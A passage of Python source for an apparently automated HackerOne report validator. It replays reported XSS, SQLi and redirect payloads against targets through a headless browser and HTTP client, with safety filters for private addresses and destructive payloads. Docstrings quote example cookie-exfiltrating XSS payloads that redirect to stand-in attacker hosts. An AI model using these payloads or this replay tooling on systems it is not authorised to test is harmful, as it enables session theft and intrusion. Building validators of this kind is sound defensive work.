"""
HackerOne vulnerability validator.

Given a parsed H1Report, attempts to reproduce the vulnerability and returns
a structured verdict. Validation strategy depends on vuln_type:

  xss            — headless Playwright loads the proof_url; checks for alert/DOM marker.
                   If blocked by auth → request manual browser session.
  sqli / ssti    — sends the proof_url via httpx; checks for error patterns / evaluation.
  open_redirect  — follows redirects; checks Location header.
  ssrf           — passive check: inspects proof_url for SSRF indicators; flags for manual review.
  dns_takeover   — DNS resolution checks: NXDOMAIN / SERVFAIL on NS records.
  auth_bypass    — strips auth headers and checks if response is still 200.
  other / unknown— LLM analyses the report text + response and gives a verdict.

When a request fails with a 401/403 or the page redirects to a login screen the
validator sets status="needs_auth" so the caller can open a browser, let the
user authenticate, then call validate_with_session() with the collected cookies.
"""

from __future__ import annotations

import asyncio
import base64
import ipaddress
import re
import time
import uuid
from dataclasses import dataclass, field, replace
from typing import Any, Dict, List, Optional
from urllib.parse import unquote, urlparse

from dast.hackerone import evidence
from dast.hackerone.parser import H1Report
from dast.utils.logger import get_logger

logger = get_logger(__name__)

# ── Input safety helpers ──────────────────────────────────────────────────────

_SAFE_SCHEMES = {"http", "https"}
_PRIVATE_NETS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),  # AWS metadata
    ipaddress.ip_network("::1/128"),
    ipaddress.ip_network("fc00::/7"),
]

def _is_safe_url(url: str) -> bool:
    """Return True only for http/https URLs that don't point at private addresses."""
    if not url:
        return False
    try:
        p = urlparse(url)
    except Exception:
        return False
    if p.scheme not in _SAFE_SCHEMES:
        return False
    host = p.hostname or ""
    if not host:
        return False
    # Reject obvious internal hostnames
    if host in ("localhost", "metadata.google.internal") or host.endswith(".internal"):
        return False
    try:
        addr = ipaddress.ip_address(host)
        if any(addr in net for net in _PRIVATE_NETS):
            return False
    except ValueError:
        pass  # hostname, not an IP — allow
    return True


def _repair_proof_url(url: str) -> str:
    """
    Deterministically normalize a proof URL so the browser drives the payload the
    reporter actually intended.

    The most common breakage: a ``javascript:`` redirect payload embeds literal
    ``+`` characters for JS string concatenation (``'loca'+'tion'``). In a URL
    query string a bare ``+`` decodes to a SPACE, so the browser turns
    ``'loca'+'tion'`` into ``'loca' 'tion'`` — invalid JS — and the redirect
    never fires. Reporters who got it working wrote ``%2b`` instead. We restore
    that: inside a ``javascript:`` parameter value, re-encode bare ``+`` as
    ``%2b`` so concatenation survives the browser's query decode.

    Also decodes HTML entities (``&amp;`` -> ``&``) that leak in from
    copy-pasted report bodies. Deterministic and cheap — the LLM repair is only a
    later fallback when this is not enough.

    Returns the URL unchanged when there is nothing to repair.
    """
    if not url:
        return url
    repaired = url.replace("&amp;", "&")
    # Only touch the '+' characters that sit inside a javascript: payload — never
    # a legitimate '+' elsewhere in the URL. Find "javascript:" and re-encode
    # bare '+' from there to the end of that parameter (next '&' or end).
    lower = repaired.lower()
    idx = lower.find("javascript:")
    if idx != -1:
        # The javascript payload runs until the next unencoded parameter break.
        end = repaired.find("&", idx)
        if end == -1:
            end = len(repaired)
        head, segment, tail = repaired[:idx], repaired[idx:end], repaired[end:]
        segment = segment.replace("+", "%2b")
        repaired = head + segment + tail
    return repaired


def _substitute_payload_in_url(url: str, payload: str, safe_variant: str) -> str:
    """
    Replace the destructive payload inside a proof URL with a safe variant.

    Handles both the raw and URL-encoded forms of the payload. Returns the URL
    unchanged if the payload cannot be located (caller treats that as a block —
    we never fall through to sending the destructive original).
    """
    if not payload or not safe_variant:
        return url
    from urllib.parse import quote
    encoded_safe = quote(safe_variant, safe="")
    # Try raw, then singly-encoded, then doubly-encoded forms of the payload.
    candidates = [payload, quote(payload, safe=""), quote(quote(payload, safe=""), safe="")]
    for needle in candidates:
        if needle and needle in url:
            # Substitute an encoded replacement so the URL stays well-formed.
            return url.replace(needle, encoded_safe)
    return url


def _sanitise_cookies(cookies: Dict[str, str]) -> Dict[str, str]:
    """Strip CRLF and limit key/value length to prevent header injection."""
    _crlf_re = re.compile(r'[\r\n]')
    safe: Dict[str, str] = {}
    for k, v in (cookies or {}).items():
        k2 = _crlf_re.sub("", str(k))[:128]
        v2 = _crlf_re.sub("", str(v))[:4096]
        if k2:
            safe[k2] = v2
    return safe


# ── Result types ─────────────────────────────────────────────────────────────

@dataclass
class ValidationResult:
    job_id: str
    status: str                  # "confirmed" | "not_confirmed" | "needs_auth" | "needs_manual" | "error"
    vuln_type: str
    proof_url: str
    payload: str
    evidence: str = ""
    reasoning: str = ""
    severity: str = ""           # info|low|medium|high|critical (from the schema verdict)
    screenshot_b64: str = ""     # base64 PNG from Playwright on confirmation
    raw_request: str = ""
    raw_response: str = ""
    duration_ms: int = 0
    checks_run: List[str] = field(default_factory=list)


# ── Auth detection ────────────────────────────────────────────────────────────

_AUTH_REDIRECT_RE = re.compile(
    r'(login|signin|sign.in|sign_in|auth|sso|unauthorized|access.denied|session.expired'
    r'|please.log.in|you.must.log.in|not.authenticated|token.expired|jwt.expired)',
    re.IGNORECASE,
)

_CAPTCHA_RE = re.compile(r'(captcha|recaptcha|hcaptcha|cloudflare|challenge)', re.IGNORECASE)

def _looks_like_auth_wall(status_code: int, url: str, body: str) -> bool:
    # Explicit auth/permission codes
    if status_code in (401, 403, 407):
        return True
    # Redirect to anything that smells like a login page
    if status_code in (301, 302, 303, 307, 308):
        return bool(_AUTH_REDIRECT_RE.search(url))
    # 200 response that is actually a login page or session-expired message
    if status_code == 200:
        snippet = body[:2000]
        if _AUTH_REDIRECT_RE.search(snippet):
            return True
        if _CAPTCHA_RE.search(snippet):
            return True
    return False


# ── XSS validation ───────────────────────────────────────────────────────────

_XSS_CONFIRM_MARKER = "DAST_H1_XSS_CONFIRM"
_XSS_ALERT_RE = re.compile(r'alert\s*\(', re.IGNORECASE)

# Hosts that are never proof of exfiltration on their own — the target's own
# origin and common CDNs/analytics a legitimate page may navigate to.
_EXFIL_HOST_IGNORE = re.compile(
    r'(google-analytics|googletagmanager|gstatic|fonts\.google|doubleclick'
    r'|cloudflare|cdnjs|jsdelivr|unpkg)',
    re.IGNORECASE,
)


def _payload_exfil_hosts(payload: str, proof_url: str) -> set[str]:
    """
    Extract candidate destination hosts embedded in a redirect/exfil XSS payload.

    A payload like ``javascript:location='https://evil.com?'+document.cookie``
    proves execution by navigating the browser to a host that is written into
    the payload but is NOT the target's own origin. We collect those hosts so a
    real off-origin navigation to one of them counts as observed execution
    (the browser followed the redirect — exactly what it is for), rather than
    relying on the LLM to read the source and speculate.

    We scan BOTH the extracted payload AND the proof URL, because the injected
    javascript: redirect very often lives entirely inside the proof URL's query
    string (``...?url=javascript:top.location='https://evil'+cookie``) while the
    report's "Payload:" label holds only prose ("victim clicks the link"). An
    earlier version scanned the payload alone and so found no exfil host in
    exactly this common shape, causing valid redirect XSS to fall to manual.

    The target's own host is excluded (navigating within the app is not proof).
    """
    hosts: set[str] = set()
    # Combine both sources and decode once — the proof URL carries the real
    # javascript: payload in the query string in the common case.
    haystack = unquote((payload or "") + " " + (proof_url or ""))
    target_host = ""
    try:
        target_host = urlparse(proof_url).netloc.lower()
    except Exception:
        target_host = ""

    for match in re.finditer(r'https?://([^/\s\'"\)\]}>&+?#;,]+)', haystack, re.IGNORECASE):
        host = match.group(1).lower().strip().rstrip(".")
        if not host or "." not in host:
            continue
        if target_host and (host == target_host or host.endswith("." + target_host)):
            continue
        if _EXFIL_HOST_IGNORE.search(host):
            continue
        hosts.add(host)
    return hosts


async def _trigger_interaction_xss(page, payload: str, exfil_hosts: set) -> None:
    """
    Some XSS only fires on user interaction — e.g. an ``<a href="javascript:...">``
    that the report describes as "victim clicks the link". Loading the page does
    not fire it; a real click does. The browser exists precisely to perform that
    click.

    Safety through understanding, not blanket exclusion: we read each candidate
    element and click it ONLY when it is our own injection — i.e. it carries a
    ``javascript:`` sink, OR the reported payload is reflected in its
    href/on*-handler attributes, OR an exfil host from the payload appears
    there. We never click a native application control (a plain ``[onclick]``
    logout/delete button), so we cannot trigger a destructive app action. This
    also broadens coverage beyond ``javascript:`` hrefs to onclick/onmouseover
    XSS, because the decision is "does this element contain what I injected?"
    rather than "what attribute type is it?".

    Each click is guarded and best-effort — a page navigating away mid-loop is
    the success case, not an error.
    """
    decoded_payload = unquote(payload or "").strip()
    # Distinctive fragments of our payload to match against element attributes.
    # Short/empty payloads are ignored to avoid accidental substring matches.
    payload_needles = {p for p in {payload, decoded_payload} if p and len(p) >= 8}
    handler_attrs = ("onclick", "onmouseover", "onmouseenter", "onfocus", "onload", "onerror")

    def _is_our_injection(href: str, attrs: dict) -> bool:
        href_l = (href or "").strip().lower()
        if href_l.startswith("javascript:"):
            return True
        haystacks = [href or ""] + [str(attrs.get(a) or "") for a in handler_attrs]
        blob = " ".join(haystacks)
        blob_dec = unquote(blob)
        for needle in payload_needles:
            if needle in blob or needle in blob_dec:
                return True
        for host in exfil_hosts:
            if host and (host in blob or host in blob_dec):
                return True
        return False

    try:
        # Candidate set: anything with a javascript: href or any on*-handler.
        # We then filter each to only our own injected elements.
        candidates = []
        for selector in ("[href]", "[onclick]", "[onmouseover]", "[onmouseenter]",
                         "[onfocus]", "[onload]", "[onerror]"):
            try:
                candidates.extend(await page.query_selector_all(selector))
            except Exception:
                continue

        seen = set()
        for element in candidates:
            if id(element) in seen:
                continue
            seen.add(id(element))
            try:
                href = await element.get_attribute("href")
                attrs = {}
                for a in handler_attrs:
                    attrs[a] = await element.get_attribute(a)
            except Exception:
                continue
            if not _is_our_injection(href or "", attrs):
                continue  # native app control — do not click
            try:
                await element.click(timeout=2000, no_wait_after=True)
                await page.wait_for_timeout(600)
            except Exception:
                # Click may fail because the page already navigated away (the
                # exfil redirect fired) — that is exactly what we wanted.
                pass
    except Exception:
        pass

async def _validate_xss(
    report: H1Report,
    proxy_port: Optional[int],
    cookies: Optional[Dict[str, str]] = None,
    screenshot: bool = True,
    _llm_repair_attempted: bool = False,
) -> ValidationResult:
    """
    Validate an XSS report by driving a real browser and confirming ONLY on
    observed execution.

    proxy_port — the MITM proxy port to route the browser through. Pass ``None``
    to drive the browser directly with no proxy (used by the end-to-end test
    harness, which serves the target from a local HTTP server and has no proxy
    running).

    _llm_repair_attempted — internal guard. When the browser observes no
    execution, we ask the LLM to reinterpret/re-encode the intended URL and retry
    ONCE with that URL. This flag prevents a second LLM repair (no infinite
    retry). The LLM only repairs the INPUT URL — it never decides the verdict;
    confirmation always comes from browser-observed execution.
    """
    job_id = str(uuid.uuid4())[:8]
    t0 = time.monotonic()

    # Deterministically repair the proof URL so the browser drives the intended
    # payload (e.g. re-encode bare '+' inside a javascript: redirect as %2b,
    # which the browser would otherwise decode to a space and break the JS).
    proof_url = _repair_proof_url(report.proof_url)
    if not proof_url:
        return ValidationResult(
            job_id=job_id, status="error",
            vuln_type="xss", proof_url="", payload=report.payload,
            evidence=evidence.build_error(
                vuln_type="xss", proof_url="",
                error="No proof URL found in the report.",
                likely_cause=(
                    "The parser could not extract a target URL from the report text. "
                    "Paste the exact PoC URL, or set it in the 'Override URL' field, then retry."
                ),
            ),
        )

    if not _is_safe_url(proof_url):
        return ValidationResult(
            job_id=job_id, status="error",
            vuln_type="xss", proof_url=proof_url, payload=report.payload,
            evidence=evidence.build_error(
                vuln_type="xss", proof_url=proof_url,
                error=f"Proof URL rejected: must be a public http/https URL (got: {proof_url[:100]}).",
                likely_cause=(
                    "The URL points at a private/loopback/internal address or uses a non-http(s) "
                    "scheme, which the validator refuses to drive for safety. Use the public "
                    "target URL, or reproduce manually against the intended host."
                ),
            ),
        )

    cookies = _sanitise_cookies(cookies or {})
    checks_run: List[str] = []

    try:
        from playwright.async_api import async_playwright, TimeoutError as PwTimeout

        async with async_playwright() as pw:
            launch_kwargs: Dict[str, Any] = {
                "headless": True,
                "args": ["--ignore-certificate-errors"],
            }
            # Route through the MITM proxy in normal operation; skip it when
            # proxy_port is None (test harness drives a local target directly).
            if proxy_port is not None:
                launch_kwargs["proxy"] = {"server": f"http://127.0.0.1:{proxy_port}"}
            browser = await pw.chromium.launch(**launch_kwargs)
            ctx = await browser.new_context(
                ignore_https_errors=True,
                viewport={"width": 1280, "height": 800},
            )

            # Inject session cookies if provided
            if cookies:
                parsed = urlparse(proof_url)
                domain = parsed.netloc
                await ctx.add_cookies([
                    {"name": k, "value": v, "domain": domain, "path": "/"}
                    for k, v in cookies.items()
                ])

            page = await ctx.new_page()
            alert_fired = False
            alert_message = ""

            # Destination hosts written into the payload — an off-origin
            # navigation to one of these is observed proof of a redirect/exfil
            # XSS (the browser followed the injected redirect).
            exfil_hosts = _payload_exfil_hosts(report.payload, proof_url)
            navigated_hosts: List[str] = []

            # Override the JS dialog sinks (alert/confirm/prompt) BEFORE
            # navigation so they fire even on synchronous inline scripts. Native
            # dialogs are OS-level and invisible in headless screenshots — we
            # inject a visible DOM banner instead so the screenshot shows proof.
            await page.add_init_script("""
                window._xssAlertFired = false;
                window._xssAlertMessage = '';
                function _xssProof(kind, msg) {
                    window._xssAlertFired = true;
                    window._xssAlertMessage = (msg === undefined || msg === null) ? '' : String(msg);
                    const banner = document.createElement('div');
                    banner.id = '__xss_proof__';
                    banner.style.cssText = [
                        'position:fixed','top:0','left:0','width:100%','z-index:2147483647',
                        'background:#ff0000','color:#ffffff','font:bold 18px monospace',
                        'padding:16px 24px','text-align:center','box-shadow:0 4px 12px rgba(0,0,0,.5)'
                    ].join(';');
                    banner.textContent = 'XSS CONFIRMED — ' + kind + '(' + JSON.stringify(window._xssAlertMessage) + ')';
                    (document.body || document.documentElement).appendChild(banner);
                }
                window.alert   = function(msg) { _xssProof('alert', msg); };
                window.confirm = function(msg) { _xssProof('confirm', msg); return true; };
                window.prompt  = function(msg) { _xssProof('prompt', msg); return ''; };
            """)

            # Dismiss any native dialogs that slip through the JS overrides.
            async def handle_dialog(dialog):
                nonlocal alert_fired, alert_message
                alert_fired = True
                alert_message = dialog.message or ""
                await dialog.dismiss()

            page.on("dialog", handle_dialog)

            # Track main-frame navigations so a redirect-style XSS (which sends
            # the browser to an attacker host embedded in the payload) is
            # observed, not inferred. This is what the browser is for.
            def handle_framenavigated(frame):
                try:
                    if frame == page.main_frame:
                        host = urlparse(frame.url).netloc.lower()
                        if host:
                            navigated_hosts.append(host)
                except Exception:
                    pass

            page.on("framenavigated", handle_framenavigated)
            checks_run.append("playwright_load")

            resp = None
            try:
                # "commit" fires as soon as the server starts responding — avoids
                # timeouts on heavy ASP.NET/SPA pages with large VIEWSTATE payloads.
                resp = await page.goto(proof_url, wait_until="commit", timeout=20000)
            except PwTimeout:
                pass  # partial load is fine — alert may have already fired
            except Exception:
                pass  # network errors (cert issues, etc.) — check what we got

            # Check for auth wall before waiting for JS
            final_url = page.url
            checks_run.append("auth_check")
            if _looks_like_auth_wall(resp.status if resp else 200, final_url, ""):
                page_text = await page.content()
                if _looks_like_auth_wall(resp.status if resp else 200, final_url, page_text):
                    ss = ""
                    if screenshot:
                        try:
                            ss = base64.b64encode(await page.screenshot()).decode()
                        except Exception:
                            pass
                    await browser.close()
                    return ValidationResult(
                        job_id=job_id, status="needs_auth",
                        vuln_type="xss", proof_url=proof_url, payload=report.payload,
                        evidence=evidence.build_inconclusive(
                            vuln_type="xss", proof_url=proof_url, payload=report.payload,
                            reason=(
                                f"The target showed an authentication wall (HTTP "
                                f"{resp.status if resp else '?'}, redirected to {final_url}), so the "
                                "payload could not be exercised. Open a browser, log in, and re-run "
                                "with the session, or reproduce manually while authenticated."
                            ),
                        ),
                        screenshot_b64=ss,
                        checks_run=checks_run,
                        duration_ms=int((time.monotonic() - t0) * 1000),
                    )

            # Wait for page load to finish (CSS/images) — non-fatal if it times out
            try:
                await page.wait_for_load_state("load", timeout=5000)
            except Exception:
                pass
            await page.wait_for_timeout(1000)
            checks_run.append("js_wait")

            def _executed_yet() -> str:
                """
                Return the observed host if an off-origin payload redirect was
                seen. Matches by domain family, not exact equality: a payload
                host of ``google.com`` is proven by a navigation to
                ``www.google.com`` (the destination often adds/strips ``www`` or
                redirects within its own domain).
                """
                for observed in navigated_hosts:
                    for target in exfil_hosts:
                        if (
                            observed == target
                            or observed.endswith("." + target)
                            or target.endswith("." + observed)
                        ):
                            return observed
                return ""

            # If nothing fired on load, drive the interaction the report
            # describes ("victim clicks the link"): click javascript: sinks so an
            # interaction-required redirect/handler actually executes. This is
            # what the browser is for — we should not fall back to manual review
            # without having tried the click.
            if not alert_fired and not _executed_yet():
                await _trigger_interaction_xss(page, report.payload, exfil_hosts)
                await page.wait_for_timeout(600)
                checks_run.append("interaction")

            # Read dialog state from injected window vars (a JS override may have
            # fired without a native "dialog" event).
            try:
                if await page.evaluate("() => window._xssAlertFired === true"):
                    alert_fired = True
                    alert_message = str(await page.evaluate("() => window._xssAlertMessage || ''"))
            except Exception:
                pass

            # Did the page navigate off-origin to a host embedded in the payload?
            # That is observed proof the injected redirect executed — the browser
            # followed it, which is exactly what the browser is for.
            exfil_navigation = _executed_yet()

            # Also check DOM for reflected payload
            page_content = await page.content()
            payload_in_dom = bool(
                report.payload
                and (unquote(report.payload) in page_content or report.payload in page_content)
            )
            checks_run.append("dom_check")

            # Screenshot after JS — banner is visible in page if a dialog fired
            page_screenshot_b64 = ""
            if screenshot:
                try:
                    page_screenshot_b64 = base64.b64encode(
                        await page.screenshot(full_page=True)
                    ).decode()
                except Exception:
                    pass

            await browser.close()

            # ── Confirmation requires OBSERVED execution ──────────────────────
            # For XSS the browser is the authority: we confirm only on a signal
            # the browser actually observed (a dialog fired, an off-origin
            # redirect to an attacker host in the payload, or the payload
            # reflected unescaped with a live alert() call). Reading the response
            # source and reasoning "this would execute" is NOT confirmation — it
            # is the false-positive path that this validator must never take.
            if alert_fired:
                return ValidationResult(
                    job_id=job_id, status="confirmed",
                    vuln_type="xss", proof_url=proof_url, payload=report.payload,
                    evidence=evidence.build_confirmed_xss(
                        proof_url=proof_url, payload=report.payload,
                        mechanism="dialog", dialog_message=alert_message or None,
                    ),
                    screenshot_b64=page_screenshot_b64,
                    checks_run=checks_run,
                    duration_ms=int((time.monotonic() - t0) * 1000),
                )

            if exfil_navigation:
                return ValidationResult(
                    job_id=job_id, status="confirmed",
                    vuln_type="xss", proof_url=proof_url, payload=report.payload,
                    evidence=evidence.build_confirmed_xss(
                        proof_url=proof_url, payload=report.payload,
                        mechanism="redirect", exfil_host=exfil_navigation,
                    ),
                    screenshot_b64=page_screenshot_b64,
                    checks_run=checks_run,
                    duration_ms=int((time.monotonic() - t0) * 1000),
                )

            if payload_in_dom and _XSS_ALERT_RE.search(page_content):
                return ValidationResult(
                    job_id=job_id, status="confirmed",
                    vuln_type="xss", proof_url=proof_url, payload=report.payload,
                    evidence=evidence.build_confirmed_xss(
                        proof_url=proof_url, payload=report.payload,
                        mechanism="reflected_alert",
                    ),
                    screenshot_b64=page_screenshot_b64,
                    checks_run=checks_run,
                    duration_ms=int((time.monotonic() - t0) * 1000),
                )

            # No execution observed yet. Before giving up, try an LLM-assisted
            # repair of the INPUT URL once: the payload may be mangled in a way
            # our deterministic repair did not catch (odd encoding, described in
            # prose, etc.). The LLM only proposes a corrected URL — the browser
            # still has to actually execute it for a confirmation. This keeps XSS
            # confirmation browser-observed while letting the LLM interpret/fix
            # the input, exactly the split the project wants.
            if not _llm_repair_attempted:
                repaired = await _llm_repair_proof_url(report, proof_url, page_content[:2000])
                if repaired and repaired != proof_url and _is_safe_url(repaired):
                    await browser.close()
                    checks_run.append("llm_url_repair")
                    retry_report = replace(report, proof_url=repaired)
                    retry = await _validate_xss(
                        retry_report, proxy_port, cookies=cookies,
                        screenshot=screenshot, _llm_repair_attempted=True,
                    )
                    # Merge the check trail so the UI shows the repair happened.
                    retry.checks_run = checks_run + [c for c in retry.checks_run if c not in checks_run]
                    return retry

            # Run the LLM as an ADVISORY analysis only — its reasoning is surfaced
            # to help the human, but for XSS it can never flip the verdict to
            # confirmed (it only sees static source, so a "confirmed" from it
            # would be speculation). Result stays needs_manual so a human follows
            # the repro steps.
            checks_run.append("llm_analysis")
            reasoning = await _llm_analyse_response(
                report, page_content[:3000], resp.status if resp else 0,
            )
            _llm_confirmed, label = _parse_llm_verdict(reasoning)
            nav_note = ""
            if navigated_hosts:
                nav_note = f" Observed navigations: {', '.join(dict.fromkeys(navigated_hosts))}."

            observed = ""
            if navigated_hosts:
                observed = (
                    "The browser only navigated to: "
                    + ", ".join(dict.fromkeys(navigated_hosts))
                    + " (no off-origin host from the payload was reached)."
                )
            return ValidationResult(
                job_id=job_id,
                status="needs_manual",
                vuln_type="xss", proof_url=proof_url, payload=report.payload,
                evidence=evidence.build_inconclusive(
                    vuln_type="xss", proof_url=proof_url, payload=report.payload,
                    reason=(
                        "No XSS execution was observed when the browser loaded the proof URL "
                        "and interacted with the injected element: no JavaScript dialog fired, "
                        "no off-origin redirect to a host in the payload, and no live reflected "
                        "alert. The endpoint may sanitize the input, require authentication, or "
                        "need an interaction the automated pass did not perform."
                    ),
                    observed=observed,
                    llm_advisory=label,
                ),
                screenshot_b64=page_screenshot_b64,
                checks_run=checks_run,
                duration_ms=int((time.monotonic() - t0) * 1000),
            )

    except Exception as exc:
        logger.debug("XSS validation error", error=str(exc))
        return ValidationResult(
            job_id=job_id, status="error",
            vuln_type="xss", proof_url=proof_url, payload=report.payload,
            evidence=evidence.build_error(
                vuln_type="xss", proof_url=proof_url,
                error=str(exc)[:200],
                likely_cause=(
                    "The headless browser could not complete the run (e.g. the target was "
                    "unreachable, a navigation/timeout error, or Playwright/chromium is not "
                    "available). Retry, or reproduce manually in a browser."
                ),
            ),
            checks_run=checks_run,
            duration_ms=int((time.monotonic() - t0) * 1000),
        )


# ── HTTP-based validation (sqli, open_redirect, generic) ─────────────────────

async def _validate_http(
    report: H1Report,
    proxy_port: int,
    cookies: Optional[Dict[str, str]] = None,
) -> ValidationResult:
    """Send the proof URL via httpx and analyse the response."""
    job_id = str(uuid.uuid4())[:8]
    t0 = time.monotonic()
    proof_url = report.proof_url
    checks_run: List[str] = []

    if not _is_safe_url(proof_url):
        return ValidationResult(
            job_id=job_id, status="error",
            vuln_type=report.vuln_type, proof_url=proof_url, payload=report.payload,
            evidence=evidence.build_error(
                vuln_type=report.vuln_type, proof_url=proof_url,
                error=f"Proof URL rejected: must be a public http/https URL (got: {proof_url[:100]}).",
                likely_cause=(
                    "The URL points at a private/loopback/internal address or uses a non-http(s) "
                    "scheme, which the validator refuses to send to for safety. Use the public "
                    "target URL, or reproduce manually against the intended host."
                ),
            ),
            checks_run=checks_run,
            duration_ms=int((time.monotonic() - t0) * 1000),
        )

    # ── Payload safety gate ───────────────────────────────────────────────────
    # Never send a destructive payload to a live target to "validate" it. Read
    # the payload/URL first: if destructive, send a detection-equivalent safe
    # variant instead; if it cannot be neutralized, do NOT send — route to
    # manual review with the safe repro steps.
    from dast.hackerone import payload_safety
    checks_run.append("payload_safety")
    send_url = proof_url
    # Honor the method/body extracted from the report so POST/PUT/JSON PoCs
    # reproduce faithfully, not just GET proof URLs.
    method = (report.http_method or "GET").upper()
    if method not in ("GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"):
        method = "GET"
    send_body = report.request_body or ""
    safety = payload_safety.make_safe(report.payload or proof_url, report.vuln_type)
    if safety.is_destructive:
        if not safety.safe_variant:
            return ValidationResult(
                job_id=job_id, status="needs_manual",
                vuln_type=report.vuln_type, proof_url=proof_url, payload=report.payload,
                evidence=evidence.build_inconclusive(
                    vuln_type=report.vuln_type, proof_url=proof_url, payload=report.payload,
                    reason=(
                        f"Auto-validation was blocked for safety: {safety.reason}. The reported "
                        "payload would perform a destructive action against the live target and "
                        "could not be rewritten into a safe, detection-equivalent probe."
                    ),
                    observed="Nothing was sent to the target (the destructive payload was withheld).",
                    extra_suggestions=[
                        "Reproduce in a NON-production / read-only environment only.",
                        "Use a non-destructive proof (boolean/time-based for SQLi; a harmless "
                        "marker for command injection) instead of the destructive statement.",
                    ],
                ),
                checks_run=checks_run,
                duration_ms=int((time.monotonic() - t0) * 1000),
            )
        # Substitute the safe variant wherever the payload appears — URL and/or
        # request body (a POST/PUT PoC carries its payload in the body).
        send_url = _substitute_payload_in_url(proof_url, report.payload, safety.safe_variant)
        body_substituted = False
        if send_body and report.payload and report.payload in send_body:
            send_body = send_body.replace(report.payload, safety.safe_variant)
            body_substituted = True
        if report.payload and send_url == proof_url and not body_substituted:
            # Could not locate the payload in the URL or body to replace it — do
            # not risk sending the destructive original.
            return ValidationResult(
                job_id=job_id, status="needs_manual",
                vuln_type=report.vuln_type, proof_url=proof_url, payload=report.payload,
                evidence=evidence.build_inconclusive(
                    vuln_type=report.vuln_type, proof_url=proof_url, payload=report.payload,
                    reason=(
                        f"Auto-validation was blocked for safety: {safety.reason}. The payload "
                        "could not be located in the proof URL or request body to substitute a "
                        "non-destructive probe, so nothing was sent."
                    ),
                    observed="Nothing was sent to the target (the destructive payload was withheld).",
                ),
                checks_run=checks_run,
                duration_ms=int((time.monotonic() - t0) * 1000),
            )
        checks_run.append("payload_neutralized")

    try:
        import httpx

        cookies = _sanitise_cookies(cookies or {})
        proxy_url = f"http://127.0.0.1:{proxy_port}"
        cookie_header = "; ".join(f"{k}={v}" for k, v in cookies.items())
        headers: Dict[str, str] = {}
        # Merge report-supplied headers (Authorization/Cookie already stripped by
        # the parser — the active session supplies auth).
        for header_name, header_value in (report.request_headers or {}).items():
            if header_name.lower() in ("authorization", "cookie"):
                continue
            headers[header_name] = header_value
        if cookie_header:
            headers["Cookie"] = cookie_header

        # Only carry a body for methods that take one.
        request_body = send_body if method in ("POST", "PUT", "PATCH", "DELETE") else ""

        async with httpx.AsyncClient(
            proxy=proxy_url, verify=False, follow_redirects=True,
            timeout=15, headers=headers,
        ) as client:
            checks_run.append("http_request")
            resp = await client.request(
                method, send_url,
                content=request_body.encode("utf-8") if request_body else None,
            )

        body = resp.text
        status = resp.status_code

        if _looks_like_auth_wall(status, str(resp.url), body):
            return ValidationResult(
                job_id=job_id, status="needs_auth",
                vuln_type=report.vuln_type, proof_url=proof_url, payload=report.payload,
                evidence=evidence.build_inconclusive(
                    vuln_type=report.vuln_type, proof_url=proof_url, payload=report.payload,
                    reason=(
                        f"The target returned an authentication wall (HTTP {status}), so the "
                        "payload could not be exercised unauthenticated. Provide a logged-in "
                        "session (open a browser and authenticate) and re-run, or reproduce "
                        "manually while logged in."
                    ),
                ),
                checks_run=checks_run,
                duration_ms=int((time.monotonic() - t0) * 1000),
            )

        raw_req_lines = [f"{method} {send_url} HTTP/1.1"]
        raw_req_lines += [f"{k}: {v}" for k, v in headers.items()]
        raw_req = "\n".join(raw_req_lines) + "\n"
        if request_body:
            raw_req += "\n" + request_body[:2000]
        raw_resp = f"HTTP/1.1 {status}\n" + "\n".join(f"{k}: {v}" for k, v in resp.headers.items()) + "\n\n" + body[:3000]

        checks_run.append("response_analysis")
        # Schema-forced verdict: the model is forced through H1_VERDICT_SCHEMA so
        # the reproduced/confidence/severity fields are always valid and typed.
        confirmed, label, severity = await _llm_verdict_http(report, body[:3000], status)

        if confirmed:
            result_evidence = label
        else:
            result_evidence = evidence.build_inconclusive(
                vuln_type=report.vuln_type, proof_url=proof_url, payload=report.payload,
                reason=(
                    "The response did not carry clear, deterministic evidence of the "
                    f"vulnerability (HTTP {status}). This validator confirms only on strong "
                    "signals; treat the reported issue as unconfirmed until reproduced manually."
                ),
                observed=f"Sent the proof request and analysed the HTTP {status} response.",
                llm_advisory=label,
            )
        return ValidationResult(
            job_id=job_id,
            status="confirmed" if confirmed else "needs_manual",
            vuln_type=report.vuln_type, proof_url=proof_url, payload=report.payload,
            evidence=result_evidence,
            severity=severity if confirmed else "",
            raw_request=raw_req[:2000],
            raw_response=raw_resp[:4000],
            checks_run=checks_run,
            duration_ms=int((time.monotonic() - t0) * 1000),
        )

    except Exception as exc:
        return ValidationResult(
            job_id=job_id, status="error",
            vuln_type=report.vuln_type, proof_url=proof_url, payload=report.payload,
            evidence=evidence.build_error(
                vuln_type=report.vuln_type, proof_url=proof_url,
                error=str(exc)[:200],
                likely_cause=(
                    "The HTTP request to the target failed (unreachable host, timeout, TLS "
                    "error, or proxy issue). Retry, or reproduce the request manually."
                ),
            ),
            checks_run=checks_run,
            duration_ms=int((time.monotonic() - t0) * 1000),
        )


# ── DNS takeover validation ───────────────────────────────────────────────────

async def _validate_dns_takeover(report: H1Report) -> ValidationResult:
    """
    Check for dangling NS / CNAME records that indicate DNS takeover risk.
    Uses dnspython if available, falls back to subprocess dig/nslookup.
    """
    job_id = str(uuid.uuid4())[:8]
    t0 = time.monotonic()
    checks_run: List[str] = []

    # Extract the target domain from the report text / URLs
    target_domain = _extract_domain(report)
    if not target_domain:
        return ValidationResult(
            job_id=job_id, status="needs_manual",
            vuln_type="dns_takeover", proof_url=report.proof_url, payload="",
            evidence=evidence.build_inconclusive(
                vuln_type="dns_takeover", proof_url=report.proof_url, payload="",
                reason=(
                    "Could not determine the target domain from the report. Set it in the "
                    "'Override domain' field and re-run."
                ),
                extra_suggestions=[
                    "dig NS <domain> +short   (look for SERVFAIL / NXDOMAIN)",
                    "dig CNAME <domain> +short",
                ],
            ),
            checks_run=checks_run,
            duration_ms=int((time.monotonic() - t0) * 1000),
        )

    evidence_lines: List[str] = []
    confirmed = False

    try:
        import dns.resolver
        import dns.exception
        _has_dnspython = True
    except ImportError:
        _has_dnspython = False

    checks_run.append(f"dns_check:{target_domain}")

    if _has_dnspython:
        import dns.resolver
        import dns.exception

        # Check NS records
        try:
            ns_answers = dns.resolver.resolve(target_domain, "NS")
